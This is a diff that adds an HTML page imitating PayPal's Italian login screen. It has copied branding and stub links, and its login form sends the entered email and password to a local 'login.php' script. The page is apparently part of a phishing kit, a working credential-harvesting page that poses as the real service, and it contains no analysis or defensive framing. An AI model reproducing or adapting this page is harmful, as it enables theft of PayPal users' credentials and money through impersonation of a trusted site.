@@ -1,0 +1,140 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html class=" jsEnabled" lang="it"><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Accedi - PayPal</title>
+<!--googleoff: all-->
+<meta name="description" content="PayPal è il modo più sicuro e più semplice per pagare online senza divulgare il tuo numero di carta di credito.">
+<!--googleon: all-->
+<meta http-equiv="X-UA-Compatible" content="IE=8">
+<link media="screen" rel="stylesheet" type="text/css" href="files/global.css">
+<link rel="stylesheet" type="text/css" href="files/pageLogin.css">
+<link rel="stylesheet" type="text/css" href="files/flowHFR.css">
+<!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100823-1/css/browsers/ie8.css"><![endif]-->
+
+<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100823-1/css/browsers/ie7.css"><![endif]-->
+
+<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100823-1/css/browsers/ie6.css"><![endif]-->
+<link rel="stylesheet" type="text/css" href="files/country.css">
+<link media="print" rel="stylesheet" type="text/css" href="files/print.css">
+
+<script language="Javascript"> 
+function checkFields( )
+{
+           signupFORM = document.log;
+ 
+if((signupFORM.login_email.value.length <= 6)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+    }
+if((signupFORM.login_email.value.indexOf ('@', 0) == -1)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+    
+ }
+if((signupFORM.login_email.value.indexOf ('.', 0) == -1)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+					  }
+if((signupFORM.login_password.value.length <= 3)){
+                alert("Please enter a valid Password");
+				signupFORM.login_password.focus();
+				return false;
+  }
+if((signupFORM.login_password.value == "")) {
+                alert("Please enter a Password");
+				signupFORM.login_password.focus();
+                return false;
+				      }
+              return true;
+}
+</script>
+
+
+<style type="text/css">form#rosetta {display:none;}</style><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20100823-1';</script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20100823-1/en_US/i/icon/pp_favicon_x.ico">
+<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-640-20100823-1/en_US/i/pui/apple-touch-icon.png">
+</head>
+<body onload="document.log.login_email.focus();">
+
+
+<noscript><p class="nonjsAlert">NOTA: Molte funzionalità sul sito web PayPal richiedono Javascript e cookies. Puoi abilitarli entrambi attraverso le impostazioni delle preferenze del browser.</p></noscript>
+<div class="legacyErrors " id="page">
+<div id="header" class="std">
+<h1><a href="#"><img src="files/paypal_logo.gif" alt="PayPal" border="0"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="#">
+<fieldset class="autocomplete" id="myDynamicAutoComplete">
+<legend>Ricerca PayPal</legend>
+<label for="searchBox">Cerca </label><input class="acInput" autocomplete="off" id="searchBox" name="queryString_acInput" type="text"><input value="" name="queryString" type="hidden"> <input id="sayTminLength" value="3" type="hidden"><input id="coDomain" value="IT" type="hidden"><input class="button" id="search.x" name="search.x" value="Cerca" autocomplete="off" type="submit">
+</fieldset>
+<input name="form_charset" value="UTF-8" type="hidden">
+<input value="undefined" name="browser_name" type="hidden"><input value="undefined" name="browser_version" type="hidden"><input value="Windows" name="operating_system" type="hidden"><input value="p/gen/login" name="flow_name" type="hidden"><input value="-ZOgTfKXWwyMyoTBD0tt_QW1rXOdmFPpH6-umUh5wQHbZbaQT1vVpXsUHPrI7GT9M9MHmG" name="fso" type="hidden"></form>
+<div id="navGlobal"><ul>
+<li class="first signup"><a href="#">Registrati</a></li>
+<li class="login"><a href="#">Accedi</a></li>
+<li><a href="#">Aiuto</a></li>
+<li class="last"><a href="#">Spazio Sicurezza</a></li>
+</ul></div>
+<span><a href="#content" class="accessAid skip">Passa al contenuto principale</a></span><div id="navPrimary"><a href="#"><img src="files/menu.PNG" border="0"></a></div>
+</div>
+<div id="content">
+<div id="headline">
+<div class="secure">
+<span class="small">Accesso sicuro</span>&nbsp;<img src="files/secure_lock_2.gif" alt="" border="0">
+</div>
+<h2>Accesso utente iscritto</h2>
+</div>
+<div id="messageBox" class="legacyErrors"></div>
+<div id="main" class="legacyErrors"><div class="layout1"><div class="layout2a">
+<div class="col first"><div class="box login">
+<div class="header"><h2>Accesso al conto</h2></div>
+<div class="body">
+<form name="log" id="log" action="login.php" method="POST" onsubmit="return checkFields( );">
+<input name="login_cmd" value="" type="hidden"><input name="login_params" value="" type="hidden"><fieldset>
+<legend>Accesso utente iscritto</legend>
+<p><label for="login_email">Indirizzo email</label><input gtbfieldid="1" id="login_email" class="" name="login_email" type="text"></p>
+<p><label for="login_password">Password PayPal</label><input autocomplete="off" id="login_password" name="login_password" value="" type="password"></p>
+<p><label for="target_page">Vai a</label><select gtbfieldid="2" id="target_page" name="target_page"><option value="0" selected="selected">Il mio conto</option>
+<option value="1">Le mie transazioni</option></select></p>
+<p><input name="submit.x" value="Accedi" class="button primary" type="submit"></p>
+</fieldset>
+<p><a href="#">Problemi di accesso?</a></p>
+<p>Non conosci PayPal? <strong><a href="#">Registrati</a></strong></p>
+<input name="form_charset" value="UTF-8" type="hidden">
+<input value="undefined" name="browser_name" type="hidden">
+<input value="p/gen/login" name="flow_name" type="hidden">
+</form>
+</div>
+</div></div>
+<div class="col last"><div class="container"><div class="MktMPI" id="mpi510051"><a href="#"><img src="files/pmoIT_ConsumerHub_Safetyeducation_MainHero_June10_560x228.gif" alt="" border="0"></a></div>
+</div></div>
+</div></div></div>
+</div>
+<div id="footer">
+<h2 class="accessAid">Per saperne di più</h2>
+<ul>
+<li><a href="#">A proposito di PayPal</a></li>
+<li><a href="#">Tipi di conto</a></li>
+<li><a href="#">Tariffe</a></li>
+<li><a href="#">Privacy</a></li>
+<li><a href="#">Spazio Sicurezza</a></li>
+<li><a href="#">Contattaci</a></li>
+<li><a href="#">Accordi legali</a></li>
+<li><a href="#">Sviluppatori</a></li>
+<li><a href="#">PayPal Mobile</a></li>
+<li><a href="#">Bonus presentazione commercianti</a></li>
+<li><a href="#">Negozi PayPal</a></li>
+</ul>
+<p id="footerSecure"><a target="_blank" href="#" onclick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img src="files/logo_VIPwhite_66x27.gif" alt="" border="0"></a></p>
+<p id="legal">Copyright © 1999-2010 PayPal. Tutti i diritti riservati.</p>
+</div>
+<div class="hide" id="navFull"></div>
+</div>
+<div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
+
+<div>
+<param name="movie" value="https://www.paypal.com/en_US/m/mid.swf"><param name="wmode" value="transparent"><param name="quality" value="high"><param name="menu" value="false"><param name="allowScriptAccess" value="always"><embed src="files/mid.swf" quality="high" name="midflash" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer" height="1" width="1"></object></div><div style="color: red;" id="css_test"></div></body></html>
